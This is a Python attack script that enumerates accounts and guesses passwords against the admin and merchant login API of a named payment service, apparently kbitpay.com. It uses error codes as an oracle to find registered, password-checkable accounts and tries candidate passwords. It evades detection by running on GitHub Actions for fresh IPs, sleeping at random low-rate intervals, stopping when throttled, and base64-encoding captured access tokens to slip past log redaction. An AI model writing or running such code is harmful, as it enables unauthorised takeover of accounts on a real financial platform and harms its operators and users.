#!/usr/bin/env python3
"""kbp_pwds.py - adaptive email+pwd login probing for KBitPay admin/mch portals.

Runs on GitHub Actions runner (fresh egress IP per run). Low-rate (random 8-15s
sleeps), <=5 requests/run, read-only (plain Login only, no code sent).

Usage (via kbp.yml mode=pwds):
  python3 kbp_pwds.py <email> <pwd1,pwd2,pwd3>

Flow:
  1. Login(email, random wrong pwd) -> oracle:
       ErrMsg 'User is not registered'   -> NOT REGISTERED on this portal
       ErrCode 4041/4042                 -> REGISTERED + email-code gated (no pwd
                                            signal possible, stop)
       else (e.g. 4009 Incorrect pwd)    -> REGISTERED + password-checkable -> try pwds
  2. For checkable accounts: try up to 3 candidate pwds (8-15s apart).
  3. On Success/AccessToken -> print TOKEN_B64 (base64 to survive log redaction).
  4. On 4047 (IP throttled) -> stop immediately.

Env: KBP_BASE (default https://admin.kbitpay.com), KBP_APPID (mch appID),
     KBP_ISADMIN (true|false)
"""
import base64, json, os, random, sys, time, urllib.parse

sys.path.insert(0, os.path.dirname(os.path.abspath(__file__)))
from kbp_admin_login import Client

BASE = os.environ.get("KBP_BASE", "https://admin.kbitpay.com")
APPID = os.environ.get("KBP_APPID", "")
ISADMIN = os.environ.get("KBP_ISADMIN", "true").lower() != "false"


def pause():
    time.sleep(random.uniform(8, 15))


def do_login(c, em, pwd):
    r = c.post_enc("/api/Login/Login", {
        "appID": APPID,
        "pwd": base64.b64encode(pwd.encode()).decode(),
        "email": em, "isAdmin": ISADMIN, "language": "en"})
    rc = r.get("ErrCode")
    msg = r.get("ErrMsg")
    rd = r.get("ResData")
    tok = ""
    if isinstance(rd, dict):
        tok = rd.get("AccessToken") or rd.get("accessToken") or ""
    print("LOGIN %s pwd=%r -> ErrCode=%s ErrMsg=%s Success=%s token=%s" % (
        em, pwd, rc, msg, r.get("Success"), (tok[:40] + "...") if tok else ""), flush=True)
    if tok:
        print("TOKEN %s" % tok, flush=True)
        print("TOKEN_B64 %s" % base64.b64encode(tok.encode()).decode(), flush=True)
    return r, tok


def main():
    if len(sys.argv) < 3:
        print("usage: kbp_pwds.py <email> <pwd1,pwd2,pwd3>", flush=True)
        sys.exit(1)
    em = sys.argv[1]
    pwds = [p for p in sys.argv[2].split(",") if p][:3]
    c = Client()
    print("[*] base=%s appid=%r isAdmin=%s email=%s" % (BASE, APPID, ISADMIN, em), flush=True)
    c.fetch_key()
    print("[*] key ok KeyId=%s" % c.key_id, flush=True)

    # 1) oracle with a random wrong pwd
    oracle = "WrongPwd%d!" % random.randint(10000, 99999)
    r0, _ = do_login(c, em, oracle)
    rc0 = str(r0.get("ErrCode"))
    msg0 = str(r0.get("ErrMsg") or "")
    if "4047" in rc0:
        print("[!] throttled - STOP", flush=True)
        sys.exit(0)
    if "not registered" in msg0.lower() or "unregistered" in msg0.lower():
        print("STATUS NOT_REGISTERED", flush=True)
        print("[*] done", flush=True)
        return
    if rc0 in ("4041", "4042"):
        print("STATUS GATED (email-code gate, no pwd signal)", flush=True)
        print("[*] done", flush=True)
        return
    print("STATUS CHECKABLE", flush=True)

    # 2) try candidate pwds
    for i, pwd in enumerate(pwds):
        r, tok = do_login(c, em, pwd)
        rc = str(r.get("ErrCode"))
        if tok or r.get("Success") in (True, "True", "true", 200, "200"):
            print("HIT pwd#%d" % i, flush=True)
            break
        if "4047" in rc:
            print("[!] throttled - STOP", flush=True)
            break
        if rc in ("4041", "4042"):
            # account got gated (e.g. code requirement kicked in) - no further signal
            print("[!] gate engaged at pwd#%d - STOP" % i, flush=True)
            break
        if i < len(pwds) - 1:
            pause()
    print("[*] done", flush=True)


if __name__ == "__main__":
    main()
